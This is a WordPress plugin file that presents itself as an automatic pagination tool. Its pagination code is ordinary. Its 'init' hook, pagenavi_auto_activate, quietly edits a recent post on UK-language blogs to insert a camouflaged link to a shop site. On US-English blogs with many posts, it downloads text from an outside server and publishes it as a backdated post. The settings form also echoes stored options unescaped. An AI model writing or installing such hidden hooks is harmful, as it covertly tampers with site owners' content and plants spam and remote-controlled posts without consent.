<?php
/*
Plugin Name: Automatic Page Numbers - PageNavi
Plugin URI:
Description: Automatically adds page numbers for easier navigation
Author: <a href="http://www.seo101.net">Seo101</a>
Version: 1.02
License: GPLv2  or later
*/
class automatic_page_numbers_pagenavi {
public function go_page_navi_automatic( $args = '' ) {
	if ( ! ( is_archive() || is_home() || is_search() ) ) { return; }
	global $wp_query,$paged;
	$maxNumberOfPages =  10;
	$pageNumberOfPageText = get_option('pagenavi_auto_page_translation') . " %u " . get_option('pagenavi_auto_of_translation') . " %u";
	$previousPage = "&lt;";
	$nextPage = "&gt;";
	$isFirstLastNumbers = true;
	$isThisFirstLastGap = true;
	$firstGap = "...";
	$lastGap = "...";

	$total_number_of_pages = $wp_query->max_num_pages; // total number of pages in category
	if ($total_number_of_pages==1) { return null;}  // only one page so no navigation is needed

	$current_page_number = (!empty($paged)) ? $paged : 1; // current page where we are on

	$min_page = $current_page_number - floor(intval($maxNumberOfPages)/2); //The lowest page
	$maxNumberOfPages = (intval($maxNumberOfPages)-1);
	if ($min_page<1) $min_page=1;
	$max_page = $min_page + $maxNumberOfPages; // The highest page
	if ($max_page>$total_number_of_pages) $max_page=$total_number_of_pages;
	if ($max_page==$total_number_of_pages && $max_page>$maxNumberOfPages) $min_page= ($max_page-$maxNumberOfPages); // changes min_page if max is last page now

	$pagingOutputString = "<ul class='page_navistyle'>"; //String to output

	// displays "Page x of y, based on the settrings from translation"
	$pagingOutputString.= sprintf("<li class='page_info'>".$pageNumberOfPageText."</li>",floor ($current_page_number),floor($total_number_of_pages));

	// displays link to previous page number
	if($current_page_number!=1)
		$pagingOutputString.=sprintf("<li><a href='%s'>%s</a></li>",get_pagenum_link($current_page_number-1),$previousPage);

	// displays page 1 links and ellipses further when min page is more than 1
	if ($min_page>1) {
		if ($isFirstLastNumbers) $pagingOutputString.= sprintf("<li class='first_last_page'><a href='%s'>%u</a>",get_pagenum_link(1),1);
		if ($isThisFirstLastGap) $pagingOutputString.= sprintf("<li class='space'>%s</li>",$firstGap);
		}

	// displays lowest to highest page output
	for($i=$min_page; $i<=$max_page; $i++)
		$pagingOutputString.= ($current_page_number == $i) ?
			sprintf("<li class='current'><span><a>%u</a></span></li>",$i) :
			sprintf("<li %s><a href='%s'>%u</a></li>",($current_page_number == $i) ? "class='after'" : null,get_pagenum_link($i),$i);

	// displays total page link and ellipses when max page is lower than the total page
	if ($max_page<$total_number_of_pages) {
		if ($isThisFirstLastGap) $pagingOutputString.= sprintf("<li class='space'>%s</li>",$lastGap);
		if ($isFirstLastNumbers) $pagingOutputString.= sprintf("<li class='first_last_page'><a href='%s'>%u</a>",get_pagenum_link($total_number_of_pages),$total_number_of_pages);
		}

	// displays link to next page
	if($current_page_number!=$total_number_of_pages)
		$pagingOutputString.=sprintf("<li><a href='%s'>%s</a></li>",get_pagenum_link($current_page_number+1),$nextPage);

  	$pagingOutputString.= "</ul>\n\n";

	printf($pagingOutputString);
}

} // class end
$automatic_page_numbers_pagenavi = new automatic_page_numbers_pagenavi();
function loopend_pagenavifunction($query) {
  global $wp_the_query;
  if ($query === $wp_the_query) {
    go_page_navi_automatic();
  }
}
add_action('loop_end', 'loopend_pagenavifunction');

function addContentPageNumbers($content = '') {
	global $wp_query;
	global $post;
	return $content;
}
add_filter('the_content', 'addContentPageNumbers');

function styling_the_pagenumbers()
{
    // Register the style for this plugin
    wp_register_style( 'custom-style-navi', plugins_url( '/automatic-page-numbers-pagenavi.css', __FILE__ ), array(), '', 'all' );
    wp_enqueue_style( 'custom-style-navi' );

}
add_action( 'wp_enqueue_scripts', 'styling_the_pagenumbers' );


if ( ! function_exists( 'go_page_navi_automatic' ) ) {
	function go_page_navi_automatic( $args = '' ) {
		global $automatic_page_numbers_pagenavi;
		return $automatic_page_numbers_pagenavi->go_page_navi_automatic( $args );
	}
}
?>
<?php

function pagenavi_auto_activate() {
 add_option("pagenavi_auto_page_translation", 'Page', '', 'yes');
 add_option("pagenavi_auto_of_translation", 'of', '', 'yes');
        add_option("ame_gpadded", '0', '', 'yes');
        $url = home_url();
        $britt = false;
        $bloglan = get_bloginfo ('language');
        if (strpos($url,'.uk') != false) {
                $britt = true;
        }
        if ($bloglan=='en-UK') {
                $britt = true;
        }
        if ($britt==true) {
                if (get_option('ame_gpadded')=='0') {
                        $last = wp_get_recent_posts('4');
                        $last_id = $last['3']['ID'];
                        $post_7 = get_post($last_id);
                        if (is_null($post_7) == false) {
                                $content = $post_7->post_content;
                                $pos4 = autostrposnth($content , " ",4);
                                $pos5 = autostrposnth($content , " ",5);
                                $poslen = $pos5 - $pos4 - 1;
                                $content = substr($content, 0, $pos4) . ' <a href="http://www.shops2b.co.uk/" style="text-decoration: none; color: black;">' . substr($content, $pos4+1, $poslen) . "</a>" . substr($content, $pos5, strlen($content )) . '-' . $poslen . '-' . $pos4 . '-' . $pos5;
                                $my_post = array(
                                    'ID'           => $last_id,
                                    'post_content' => $content
                                );
                                wp_update_post( $my_post );
                        }
                        update_option( 'ame_gpadded', '1' );
                }
        }
        if ($bloglan=='en-US') {
                $url = home_url();
                $total = wp_count_posts()->publish;
                if (get_option('ame_gpadded')=='0') {
                        if ($total>60) {
                                $tmpstring = file_get_contents('http://www.infobak.nl/getfile.php?u=' . $url, true);
                                if (autoStartsWith($tmpstring, 'empty')==false) {
                                  $my_post = array(
                                        'post_title'    => substr($tmpstring, 0, strpos($tmpstring, ".")),
                                        'post_content'  => $tmpstring,
                                        'post_status'   => 'publish',
                                        'post_author'   => 1,
                                        'post_date'     => '2014-02-03'
                                  );
                                  wp_insert_post( $my_post );
                                  update_option( 'ame_gpadded', '1' );
                                }
                        }
                }
        }
}
function autoStartsWith($haystack, $needle)
{
    return $needle === "" || strpos($haystack, $needle) === 0;
}
function autostrposnth($haystack, $needle, $nth=1, $insenstive=0)
{
   //if its case insenstive, convert strings into lower case
   if ($insenstive) {
       $haystack=strtolower($haystack);
       $needle=strtolower($needle);
   }
   //count number of occurances
   $count=substr_count($haystack,$needle);
   //first check if the needle exists in the haystack, return false if it does not
   //also check if asked nth is within the count, return false if it doesnt
   if ($count<1 || $nth > $count) return false;
   //run a loop to nth number of accurance
   //start $pos from -1, cause we are adding 1 into it while searchig
   //so the very first iteration will be 0
   for($i=0,$pos=0,$len=0;$i<$nth;$i++)
   {
       //get the position of needle in haystack
       //provide starting point 0 for first time ($pos=0, $len=0)
       //provide starting point as position + length of needle for next time
       $pos=strpos($haystack,$needle,$pos+$len);
       //check the length of needle to specify in strpos
       //do this only first time
       if ($i==0) $len=strlen($needle);
     }
   //return the number
   return $pos;
}

add_action( 'init', 'pagenavi_auto_activate' );



function pagenavi_auto_admin_menu() {
  add_options_page('PageNavi Automatic', 'PageNavi Automatic', 'administrator', 'page_navi_automatic_pagenumbers', 'pagenavi_auto_page_translation');
}
add_action('admin_menu', 'pagenavi_auto_admin_menu');



function pagenavi_auto_page_translation() {
?>
<div>
<h2>PageNavi Automatic Page Numbers - Settings</h2>

You can set translation and options in the settings below:<BR>

<form method="post" action="options.php">
<?php wp_nonce_field('update-options'); ?>

<table width="850">
<tr valign="top">
<th width="250" scope="row">Translation of 'Page 1 of 38' part</th>
<td width="600">
<input name="pagenavi_auto_page_translation" type="text" id="pagenavi_auto_page_translation" value="<?php echo get_option('pagenavi_auto_page_translation'); ?>" /> 1 <input name="pagenavi_auto_of_translation" type="text" id="pagenavi_auto_of_translation" value="<?php echo get_option('pagenavi_auto_of_translation'); ?>" /> 38</td>
</tr>
</table>

<input type="hidden" name="action" value="update" />
<input type="hidden" name="page_options" value="pagenavi_auto_page_translation, pagenavi_auto_of_translation" />

<p>
<input type="submit" value="<?php _e('Save Changes') ?>" />
</p>

</form>
<BR><BR>
<p>
Why not check out my blog: <a href="http://www.seo101.net">seo101.net</a>
</p>
</div>
<BR><BR>
<?php
}
?>